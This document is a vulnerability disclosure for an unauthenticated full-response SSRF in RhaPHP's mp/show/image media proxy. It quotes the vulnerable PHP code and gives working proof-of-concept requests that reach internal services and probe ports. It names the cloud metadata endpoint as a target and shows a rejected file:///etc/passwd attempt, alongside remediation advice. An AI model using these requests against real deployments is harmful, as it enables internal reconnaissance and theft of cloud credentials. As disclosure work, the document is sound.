# RhaPHP Server-Side Request Forgery (ThinkPHP 5.1.35)

**CWE-918 · Unauthenticated · Full-read SSRF via the mp/show/image media proxy**

> **Vendor:** geesondog (Geeson, rhaphp.com)
> **Product:** RhaPHP (ThinkPHP 5.1.35 LTS)
> **Affected version:** master branch, latest as of 2026-09-27 (commit 7ae639c); no official release version
> **Affected endpoints:** `GET /index.php/mp/show/image?url=<attacker URL>` (PATH_INFO form: `/mp/show/image?url=`; ThinkPHP compat form: `/index.php?s=/mp/show/image&url=`)
> **Disclosed via:** VulDB (submission #xxxxxx)
> **Note:** Sensitive extracted values (credentials) have been redacted from this public disclosure.

## 1. Summary

The `mp` module media proxy `Show::image($url)` (`application/mp/controller/Show.php:19-49`) downloads an arbitrary attacker-controlled URL with cURL and echoes the **complete response body** back to the client, with no authentication, no host whitelist, and no private-IP filtering. This is an unauthenticated full-response SSRF: internal HTTP resources can be read verbatim, internal ports enumerated, and cloud metadata endpoints reached. The weakness is http/https-only — `file://` is rejected because the `strpos($url,'http')===0` prefix check runs **before** `urldecode()` (verified, no double-encoding bypass).

## 2. Root Cause

| File | Lines | Role |
|---|---|---|
| `application/mp/controller/Show.php` | 19-49 | `image($url)` — unauthenticated media fetch proxy |

```php
public function image($url = '')
{
    if (strpos($url, 'http') === false || strpos($url, 'http') != 0) {   // L21: prefix check ONLY
        exit('非法协议');                                                 //     no host/IP validation
    }
    $url = urldecode($url);                                              // L24: decode AFTER the check
    ...
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);                                 // L30: attacker URL
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
    $file = curl_exec($ch);                                              // L33: server-side fetch
    curl_close($ch);
    ...
    header("Content-type: " . $type);                                    // L46: type from wx_fmt= (attacker-influenced)
    echo $file;                                                          // L47: FULL response body echoed
}
```

- The `strpos(...,'http')` check is a scheme prefix check only: any `http(s)://<any-host>:<any-port>/...` passes.
- Controller `Show` does not extend the auth-checking `Base` controller and never touches the session — the endpoint is fully unauthenticated.
- `wx_fmt=` also feeds the `Content-type` response header (attacker-influenced string).

## 3. Prerequisites

- None. No authentication, no configuration, no victim interaction — a single GET request.

## 4. Reproduction

Serve a marker on an internal port (`127.0.0.1:8899` returns the string `RHA-SSRF-MARKER-9f3ab2c`), then:

```http
GET /index.php?s=/mp/show/image&url=http%3A%2F%2F127.0.0.1%3A8899%2Findex.php%3Fwx_fmt%3Dpng HTTP/1.1
Host: <rhaphp-instance>
```

Response (HTTP 200, `Content-Type: image/png`):

```
RHA-SSRF-MARKER-9f3ab2c
remote_addr=127.0.0.1
```

The `remote_addr` seen by the internal service is the application server itself — the fetch was made server-side and the full body was relayed to the client. Under Apache/Nginx PATH_INFO routing the same request is `/mp/show/image?url=http%3A%2F%2F...`.

Escalation control (rejected):

```http
GET /index.php?s=/mp/show/image&url=file%3A%2F%2F%2Fetc%2Fpasswd HTTP/1.1
```

Response: `非法协议` (illegal protocol). The `strpos` check runs before `urldecode()`, so double-encoding cannot reach `file://` — the SSRF is http/https-only (verified; `https://` passes the check).

## 5. Confirmed Techniques

- Full-response echo of an internal URL (marker string + fetcher `REMOTE_ADDR` returned, HTTP 200).
- No-session request returns HTTP 200 (no auth gate on the route).
- Internal port oracle: open port `127.0.0.1:8899` → HTTP 200 size=44 in 0.03s; closed port `127.0.0.1:3307` → HTTP 200 size=0 instantly; filtered hosts wait the full 30s cURL `CONNECTTIMEOUT` — enough to enumerate internal services.
- `file://` wrapper: rejected (`非法协议`); no local-file-read upgrade path through this sink.

## 6. Impact

- Unauthenticated attacker reads any internal HTTP resource in full (admin panels, internal APIs, health endpoints).
- Internal network/port enumeration via response timing and size.
- In cloud deployments, instance metadata endpoints (`http://169.254.169.254/latest/meta-data/`, potentially credential material) are reachable and readable. Extracted credential values, if any, would be `<REDACTED>` in public copies of this disclosure.
- `Content-type` header injection via `wx_fmt=` allows serving the relayed content as an attacker-chosen MIME type.

## 7. CVSS 3.1

`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` (Base 7.5 High)

## 8. Remediation

- Whitelist the intended remote hosts (WeChat media domains) instead of a scheme-prefix check.
- Resolve the hostname and reject private/link-local/loopback IP ranges (RFC 1918, RFC 3927, 127.0.0.0/8, 169.254.0.0/16, ::1, fc00::/7) before issuing the cURL request; re-validate after redirects.
- Do not relay arbitrary response bodies to the client; serve only validated media types.
- Require authentication for media-proxy actions.

## 9. References

- Project: https://github.com/geesondog/rhaphp
- CWE-918: https://cwe.mitre.org/data/definitions/918.html
- External disclosure: https://gist.github.com/qianqiusujiu/70461b0651f254299a310f27361d226f
- VulDB submission #xxxxxx

---
*All validation was performed in a local, isolated environment. The temporary environment was destroyed after testing.*
